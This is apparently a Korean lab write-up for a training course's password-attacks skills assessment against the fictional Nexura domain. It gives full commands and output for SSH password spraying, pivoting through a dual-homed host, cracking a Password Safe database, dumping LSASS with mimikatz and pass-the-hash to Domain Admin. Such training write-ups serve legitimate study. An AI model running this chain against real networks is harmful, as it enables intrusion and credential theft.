---
title: "Password Attacks - Skills Assessment"
date: 2026-08-26
layout: single
excerpt: "Nexura LLC의 직원 Betty Jayde가 여러 웹사이트에서 사용하던 비밀번호를 회사 환경에서도 재사용하고 있을 가능성이 확인되었다. 알려진 자격 증명을 바탕으로 외부에 노출된 DMZ01에서 초기 접근 가능성을 확인하고, 이후 JUMP01과 FILE01을 포함한 내부 네트워크로 침투 범위를 확장해야 한다. 각 시스템에서 추가 자격 증명과 접근 경로를 확보하여 최종적으로 Nexura의 Domain Controller인 DC01에서 명령 실행 권한을 획득할 수 있는지 확인해야 한다."
author_profile: true
toc: true
toc_label: "Password Attacks"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-infra/password-attacks-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-infra]
tags: [cpts, password-attacks, credential-reuse, smb, lsass, lateral-movement]
---

# Scenario

`Betty Jayde`는 `Nexura LLC`에서 근무하고 있다.

우리는 Betty가 여러 웹사이트에서 다음 비밀번호를 사용하고 있다는 사실을 알고 있다:

```text
Texas123!@#
```

그리고 그녀가 회사에서도 이 비밀번호를 재사용하고 있을 가능성이 있다고 판단하고 있다.

**Nexura의 네트워크에 침투하여 Domain Controller에서 명령 실행 권한(command execution)을 획득하라.**

이번 평가에서 공격 가능한 범위(in-scope)는 다음 시스템들이다:

| 호스트      | IP 주소                                   |
| -------- | --------------------------------------- |
| `DMZ01`  | `10.129.161.56` (외부), `172.16.119.13` (내부) |
| `JUMP01` | `172.16.119.7`                          |
| `FILE01` | `172.16.119.10`                         |
| `DC01`   | `172.16.119.11`                         |

## Username Generation and Password Reuse

우선 외부에 노출된 DMZ01을 포트 스캔한 결과 TCP/22의 SSH 서비스만 확인되었다:

```bash
$ nmap -sC -sV 10.129.161.56                                           

Nmap scan report for 10.129.161.56
Host is up (0.22s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

시나리오에서 Betty Jayde가 여러 웹사이트에서 `Texas123!@#` 를 사용한다는 정보가 제공되었으므로, 회사에서도 동일한 비밀번호를 재사용했는지 확인해볼 수 있다.

먼저 Betty Jayde의 이름을 기반으로 가능한 사용자명 후보를 생성한 뒤 SSH 인증에 대입하였다.

`username-anarchy` 를 이용해 사용자명 후보 목록을 생성하였다:

```bash
$ ./username-anarchy Betty Jayde > betty.txt
```

이후 NXC로 생성한 사용자명 후보와 알려진 비밀번호를 검증한 결과 `jbetty` 계정에서 로그인이 성공하였다:

```bash
$ nxc ssh 10.129.161.56 -u betty.txt -p 'Texas123!@#'

SSH         10.129.161.56   22     10.129.161.56    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
# SKIP
SSH         10.129.161.56   22     10.129.161.56    [-] bjayde:Texas123!@#
SSH         10.129.161.56   22     10.129.161.56    [+] jbetty:Texas123!@#  Linux - Shell access!
```

## DMZ01 Access and Internal Network Discovery

SSH로 `DMZ01` 에 접속한 뒤 네트워크 인터페이스를 확인하였다:

```bash
jbetty@DMZ01:~$ ifconfig

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.161.56  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::a0de:adff:fe6c:e8b6  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::a0de:adff:fe6c:e8b6  prefixlen 64  scopeid 0x0<global>
        ether a2:de:ad:6c:e8:b6  txqueuelen 1000  (Ethernet)
        RX packets 1350  bytes 120202 (120.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 354  bytes 53743 (53.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.119.13  netmask 255.255.255.0  broadcast 172.16.119.255
        inet6 fe80::a0de:adff:fe1e:405d  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:1e:40:5d  txqueuelen 1000  (Ethernet)
        RX packets 237  bytes 15259 (15.2 KB)
        RX errors 0  dropped 12  overruns 0  frame 0
        TX packets 15  bytes 1226 (1.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`DMZ01` 은 외부망 `10.129.161.56` 과 내부망 `172.16.119.13/24` 에 동시에 연결된 Dual-Homed Host임을 확인할 수 있다.

추가 열거 과정에서 Shell History에 `FILE01` 로 접속할 때 사용했던 명령과 자격 증명이 남아 있는 것을 확인하였다:

```text
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

이를 통해 `hwilliam:dealer-screwed-gym1` 자격 증명을 확보하였다.

Kali에서 내부 `172.16.119.0/24` 대역으로 직접 접근할 수 없으므로, `DMZ01` 을 경유하는 SSH Dynamic Port Forwarding을 구성하였다:

```bash
$ ssh -D 1080 -N jbetty@10.129.161.56
```

## FILE01 Share Enumeration

이후 ProxyChains를 통해 `FILE01` 의 SMB Share를 열거하였다:

```bash
$ proxychains -q nxc smb 172.16.119.10 -u hwilliam -p dealer-screwed-gym1 --shares

SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:None)
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark
SMB         172.16.119.10   445    FILE01           -----           -----------     ------
SMB         172.16.119.10   445    FILE01           ADMIN$                          Remote Admin
SMB         172.16.119.10   445    FILE01           C$                              Default share
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE      
SMB         172.16.119.10   445    FILE01           IPC$            READ            Remote IPC
SMB         172.16.119.10   445    FILE01           IT                              
SMB         172.16.119.10   445    FILE01           MANAGEMENT                      
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE      
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE    
```

`PRIVATE` Share 내부에서 비밀번호와 관련된 문자열을 검색한 결과 `Online passwords.xlsx` 파일이 확인되었다:

```bash
$ proxychains -q nxc smb 172.16.119.10 -u hwilliam -p dealer-screwed-gym1 --spider "PRIVATE" --content --pattern "passw" 

SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:None)
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
SMB         172.16.119.10   445    FILE01           [*] Spidering .
SMB         172.16.119.10   445    FILE01           //172.16.119.10/PRIVATE/hwilliam/Online passwords.xlsx [lastm:'2025-04-29 12:16' size:7360]
```

해당 파일을 로컬로 다운로드하였다:

```bash
$ proxychains -q nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' --share PRIVATE --get-file 'hwilliam\Online passwords.xlsx' 'Online passwords.xlsx'

SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:None)
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
SMB         172.16.119.10   445    FILE01           [*] Copying "hwilliam\Online passwords.xlsx" to "Online passwords.xlsx"
SMB         172.16.119.10   445    FILE01           [+] File "hwilliam\Online passwords.xlsx" was downloaded to "Online passwords.xlsx"
```

하지만 `xlsx2csv` 로 내용을 확인한 결과 비밀번호나 추가 자격 증명은 포함되어 있지 않았다:

```bash
$ xlsx2csv 'Online passwords.xlsx'

0,First Name,Last Name,Gender,Country,Age,Date,Id
1,Dulce,Abril,Female,United States,32,15/10/2017,1562
2,Mara,Hashimoto,Female,Great Britain,25,16/08/2016,1582
3,Philip,Gent,Male,France,36,21/05/2015,2587
```

따라서 `smbclient` 를 이용해 `HR` Share를 직접 확인하였다:

```bash
$ proxychains -q smbclient //172.16.119.10/HR -U 'nexura.htb\hwilliam'
```

`Archive` 디렉터리에는 과거 HR 문서와 함께 Password Safe 관련 파일이 존재하였다:

```text
smb: \Archive\> ls
  .                                   D        0  Tue Apr 29 12:10:24 2025
  ..                                  D        0  Tue Apr 29 12:10:24 2025
  Code of Conduct_OLD.xlsx            A    29380  Tue Apr 29 12:02:27 2025
  Company presentation OLD.ppt        A   912384  Tue Apr 29 12:02:52 2025
  Covid 19 Policy.ppt                 A   912384  Tue Apr 29 12:02:52 2025
  Employee Roster 2023.xlsx           A    13246  Tue Apr 29 12:02:30 2025
  Employee-Passwords_OLD.plk          A       48  Tue Apr 29 11:13:43 2025
  Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 11:09:57 2025
  Employee-Passwords_OLD_011.ibak      A      856  Tue Apr 29 11:10:02 2025
  Employee-Passwords_OLD_012.ibak      A      904  Tue Apr 29 11:10:04 2025
  Employee-Passwords_OLD_013.ibak      A      952  Tue Apr 29 11:10:07 2025
  Employee_handbook_2025.doc          A    26069  Tue Apr 29 12:02:39 2025
  Exit interview Questions.docx       A    34375  Tue Apr 29 12:01:34 2025
  HR Audit Guide ARCHIVE.docx         A    34375  Tue Apr 29 12:01:34 2025
  HR Budget Forecast 2026.xlsx        A    32924  Tue Apr 29 12:02:28 2025
  HR Policies and Procedures.docx      A   120515  Tue Apr 29 12:01:34 2025
  HRIS System Training.xlsx           A    29380  Tue Apr 29 12:02:27 2025
  Interview Questions Template.doc      A    32768  Tue Apr 29 12:02:38 2025
  Manager Onboarding Program.ppt      A   530432  Tue Apr 29 12:02:52 2025
  Offboarding Checklist.docx          A  1311881  Tue Apr 29 12:01:35 2025
  Offer Letter Template_OLD.docx      A   120515  Tue Apr 29 12:01:34 2025
  Password Policy OUTDATED.doc        A    32768  Tue Apr 29 12:02:38 2025
  PTO Tracking Sheet OLD.ppt          A  1028096  Tue Apr 29 12:02:49 2025
  Temporary Contractor List_OLD.xlsx      A    32924  Tue Apr 29 12:02:28 2025
```

이 중 자격 증명이 포함되어 있을 가능성이 높은 `Employee-Passwords_OLD.psafe3` 파일을 다운로드하여 확인하였다.

`file` 명령으로 확인한 결과 Password Safe V3 데이터베이스였다:

```bash
$ file Employee-Passwords_OLD.psafe3

Employee-Passwords_OLD.psafe3: Password Safe V3 database
```

Password Safe 파일 자체가 Master Password로 보호되어 있으므로, `pwsafe2john` 으로 John이 처리할 수 있는 형식으로 변환하였다.

```bash
$ pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash 
```

이후 Wordlist Attack을 수행한 결과 데이터베이스의 Master Password를 확인할 수 있었다:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/newjohn.pot psafe.hash

Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
michaeljackson   (Employee-Passwords_OLD) 
```

Master Password는 `michaeljackson` 이었으며, 이를 이용해 Password Safe 데이터베이스를 열 수 있었다.

데이터베이스 내부에는 다음과 같은 도메인 계정 자격 증명이 저장되어 있었다:

```text
bdavid : caramel-cigars-reply1
stom   : fails-nibble-disturb4
```

## JUMP01 Access

이 중 `bdavid` 자격 증명을 `JUMP01` 의 WinRM에 검증한 결과 관리자 수준의 접근이 가능한 것으로 확인되었다:

```bash
$ proxychains -q nxc winrm 172.16.119.7 -u bdavid -p caramel-cigars-reply1

WINRM       172.16.119.7    5985   JUMP01           [*] Windows 10 / Server 2019 Build 17763 (name:JUMP01) (domain:nexura.htb) 
WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)
```

반면 Password Safe에 저장되어 있던 `stom:fails-nibble-disturb4` 자격 증명은 현재 환경에서는 유효하지 않았다.

비밀번호가 변경되었거나 저장된 정보가 오래된 것일 수 있으므로, 이후 다른 Credential Source를 확인할 필요가 있다.

이후 `bdavid` 로 `JUMP01` 에 WinRM 접속한 뒤 토큰 권한을 확인하였다:

```bash
$ proxychains -q evil-winrm -i 172.16.119.7 -u bdavid -p caramel-cigars-reply1

*Evil-WinRM* PS C:\Users\bdavid\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
# SKIP
```

## LSASS Credential Extraction

`JUMP01` 에서 관리자 수준의 권한을 확보했으므로, 현재 시스템에 존재하는 로그온 세션의 Credential Material이 LSASS에 남아 있는지 확인할 수 있다.

Mimikatz를 실행하여 LSASS의 로그온 세션 정보를 확인하였다:

```powershell
*Evil-WinRM* PS C:\Users\bdavid\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 267086 (00000000:0004134e)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 9/12/2026 11:49:36 AM
SID               : S-1-5-21-1333759777-277832620-2286231135-1106
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
        tspkg :
        wdigest :
         * Username : stom
         * Domain   : NEXURA
         * Password : (null)
        kerberos :
         * Username : stom
         * Domain   : NEXURA.HTB
         * Password : calves-warp-learning1
        ssp :
        credman :
```

그 결과 `stom` 의 NTLM Hash와, Kerberos Credential 영역에 남아 있던 평문 비밀번호 `calves-warp-learning1` 을 확인할 수 있었다.

이 NTLM Hash는 Password Safe에 저장된 오래된 값이 아니라 현재 시스템의 로그온 세션에서 추출된 Credential Material이다.

## Pass-the-Hash to DC01

따라서 `stom` 의 NTLM Hash를 이용해 DC01의 SMB 인증을 확인한 결과 NXC에서 `Pwn3d!`가 표시되었다. 

이는 해당 호스트의 SMB 관점에서 로컬 관리자 수준의 권한을 가진 것으로 판단할 수 있음을 의미한다:

```bash
$ proxychains -q nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa  

SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                                  
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:21ea958524cfd9a7791737f8d2f764fa (Pwn3d!)
```

SMB 관리자 권한이 확인되었더라도 WinRM 사용 가능 여부는 별개이므로, 동일한 NTLM Hash로 WinRM 접속을 직접 확인하였다:

```bash
$ proxychains -q evil-winrm -i 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa

*Evil-WinRM* PS C:\Users\stom\Documents>
```

접속 후 `whoami /groups` 를 확인한 결과 `NEXURA\Domain Admins` 와 `BUILTIN\Administrators` 가 활성화된 그룹으로 나타났다. 

따라서 `stom` 은 Domain Admin 권한을 가진 계정이며, 최종적으로 `DC01` 에서 고권한 명령 실행이 가능한 상태임을 확인하였다:

```powershell
*Evil-WinRM* PS C:\Users\stom\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
```